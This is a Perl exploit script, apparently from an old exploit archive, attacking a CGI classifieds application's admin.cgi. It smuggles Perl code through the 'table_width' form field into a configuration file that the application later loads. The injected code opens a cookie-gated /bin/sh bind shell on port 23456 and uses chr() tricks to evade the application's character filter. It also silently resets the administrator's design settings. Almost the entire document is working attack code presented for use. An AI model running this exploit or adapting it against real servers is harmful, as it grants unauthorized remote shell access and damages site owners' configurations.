#!/usr/bin/perl -w
# exploit by Igor Dobrovitski noident@my-deja.com
# This exploit will spawn an interactive shell on port 23456
# A configuration file that is added to the admin.cgi at runtime through 'require' statement
# can be ovewritten. We can write to that file, but can't read it, so we simply restore
# the default settings. If the administrator made changes to the file
# 'websites/default/variables/design.pl', those changes will be lost and defaults restored.
# Our shell code is also written to that file, but will only be executed if the password
# cookie is supplied. Whoever else invokes the script won't trigger the shell.
# Enjoy
use Socket;
$| = 1;
####################################################################################################
$password = 'noident';   # Our cookie password, change it if you want, don't set to empty string
# Some metacharacters, like quotes and '&'  are filtered so  the code looks a bit weird
$exec_code = 'use Socket;$shell = (chr 47) . bin . (chr 47) . sh . (chr 32) . (chr 45) . (chr 105);socket(SOCK, PF_INET, SOCK_STREAM, 6);setsockopt(SOCK, SOL_SOCKET, SO_REUSEADDR, 1);$port=23456;bind(SOCK, sockaddr_in($port, INADDR_ANY));listen(SOCK, 1);accept (NEW, SOCK);if(!fork()){open STDIN, (chr 60) . (chr 38) . NEW; open STDOUT, (chr 62) . (chr 38) . NEW;open STDERR, (chr 62) . (chr 38) . NEW;exec $shell}else{close NEW;exit;}';
####################################################################################################
unless(defined $ARGV[0]) {die "Usage: $0 www.example.com/cgi-bin/blah/classifieds/admin.cgi\n"}
$ARGV[0] =~ s|^(?:http://)*||;
($host, $scriptpath) = $ARGV[0] =~ m|^(.*?)(/.*)$|;
my $form = makeform({
    'request' => 'submit_edit_design_variables',
    'bgcolor' => '#FFFFFF',
    'text' => '#000000',
    'link' => 'navy',
    'vlink' => '#aaaaaa',
    'alink' => '#FFCC00',
    'marginheight' => '0',
    'marginwidth' => '0',
    'topmargin' => '0',
    'leftmargin' => '0',
    'background' => '',

    'table_width' => "600';\nif(\$ENV{HTTP_COOKIE} eq \'$password\'){$exec_code}\n\$blah = '",
    'header_row_color' => '#666666',
    'mouse_over_color' => '#DDDDDD',
    'line_color' => '#C0C0C0',
    'alternate_row_color' => '#EEEEEE',

    'inverse_font_color' => '#FFFFFF',
    'alternate_font_color' => '#666666',
    'font_face' => 'arial, helvetica',
    'small_font_size' => '1',
    'standard_font_size' => '2',
    'large_font_size' => '3',

    'max_records_per_page' => '20',
    'allow_show_all' => 'yes',
    'display_ad_count' => 'yes',
    'display_icons' => 'yes',
    'display_ad_totals' => 'yes',
    'display_ad_postdate' => 'yes',
    'display_location' => 'yes',

    'date_format' => '3',

    'months' => 'January\nFebruary\nMarch\nApril\nMay\nJune\nJuly\nAugust\nSeptember\nOctober\nNovember\nDecember',
    'shortmonths' => 'Jan\nFeb\nMar\nApr\nMay\nJun\nJul\nAug\nSept\nOct\nNov\nDec',
    'weekdays' => 'Sunday\nMonday\nTuesday\nWednesday\nThursday\nFriday\nSaturday',
    'years' => '2000\n2001\n2002\n2003\n2004',
    'states' => 'Alabama\nAlaska\nArizona\nArkansas\nCalifornia\nColorado\nConnecticut\nDistrict of Columbia\nDelaware\nFlorida\nGeorgia\nGuam\nHawaii\nIdaho\nIllinois\nIndiana\nIowa\nKansas\nKentucky\nLouisiana\nMaine\nMaryland\nMassachusetts\nMichigan\nMinnesota\nMississippi\nMissouri\nMontana\nNebraska\nNevada\nNew Hampshire\nNew Jersey\nNew Mexico\nNew York\nNorth Carolina\nNorth Dakota\nOhio\nOklahoma\nOregon\nPennsylvania\nPuerto Rico\nRhode Island\nSouth Carolina\nSouth Dakota\nTennessee\nTexas\nUtah\nVermont\nVirginia\nWashington\nWest Virginia\nWisconsin\nWyoming\n-------------------------\nCanada - Alberta\nCanada - British Columbia\nCanada - Manitoba\nCanada - New Brunswick\nCanada - Newfoundland\nCanada - Northwest Territories\nCanada - Nova Scotia\nCanada - Ontario\nCanada - Prince Edward Island\nCanada - Quebec\nCanada - Saskatchewan\nCanada - Yukon\n-------------------------\nUK - Channel Islands\nUK - England - London\nUK - England - Mid\nUK - England - North\n!
UK - England - Southeast\nUK - England - Southwest\nUK - Isle of Man\nUK - Northern Ireland\nUK - Scotland\nUK - Wales\n-------------------------\nEurope - Eastern Europe\nEurope - France\nEurope - Germany\nEurope - Ireland\nEurope - Italy\nEurope - Netherlands\nEurope - Scandinavia\nEurope - Other\n-------------------------\nAsia and Pacific - Australia\nAsia and Pacific - India\nAsia and Pacific - Japan\nAsia and Pacific - New Zealand\nAsia and Pacific - Other\n-------------------------\nAfrica\nLatin America\nMiddle East\nOther Area'
});
print "Engaging the enemy. Please stand by...\n";
for(my $i=0;$i<2;$i++)
{
# first time we overwrite the require'd file
# second time we execute the script, the poisoned file is loaded, checks our cookie and
# opens the backdoor for us. After that it exits without overwriting the file the 2nd time
    &send($form);
}
&oops_the_sploit_did_not_work();

sub makeform
{
    my $string;
    my @blah;
    my $line  = '';
    my $here;
    my %data = %{$_[0]};
    foreach my $key (keys %data)
    {
        $line .= "$key" . 'AAAA' . "$data{$key}" . 'BBBB';
    }
    $line =~ s|^(.*)BBBB$|$1|;
    $line =~ s/\\n/\n/g;
    $line =~ s/\\t/\t/g;
    $line =~ s/\\e/\e/g;
    $line =~ s/\\f/\f/g;
    $line =~ s/\\r/\r/g;
    $line =~ s/\\0/\0/g;
    foreach my $char (split //, $line)
    {
        if($char !~ m/[A-Za-z0-9._ ]/)
        {
            $char = unpack "H2", $char;
            $char = '%' . "$char";
        }
        push @blah, $char;
    }
    $string = join "",@blah;
    $string =~ s/AAAA/=/g;
    $string =~ s/BBBB/&/g;
    $string =~ s/ /+/g;
    my $cont_len = length($string);
$here = <<EOF;
POST $scriptpath HTTP/1.0
User-Agent: Mozilla (Windows 98)
Host: $host
cookie: $password
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*
Accept-Encoding: gzip
Accept-Language: en
Accept-Charset: iso-8859-1,*,utf-8
Content-type: application/x-www-form-urlencoded
Content-length: $cont_len

$string
EOF
    return $here;
}

sub send
{
    my $form_to_send = shift;
    my $h = inet_aton($host) or die "Forward lookup for $host failed\n";
    socket(S,PF_INET,SOCK_STREAM,6) or die "socket prolems\n";
    unless(connect(S,sockaddr_in(80,$h))) {print STDERR "Couldn't connect to " . inet_ntoa($h) . "\n"
; close(S); exit 1 }
    select(S);
    $|=1;
    print "$form_to_send";
    local($SIG{ALRM}) = sub { print STDERR "Timeout was expected. The shell awaits you on port 23456\nHave fun and be excellent to the webmaster.\n"; exit };
    alarm(20);
    my @reply=<S>;
    select(STDOUT);
    close(S);
    return @reply;
}

sub oops_the_sploit_did_not_work
{
    print STDERR "The exploit didn't work on this host\nSorry...\n";
    exit;
}
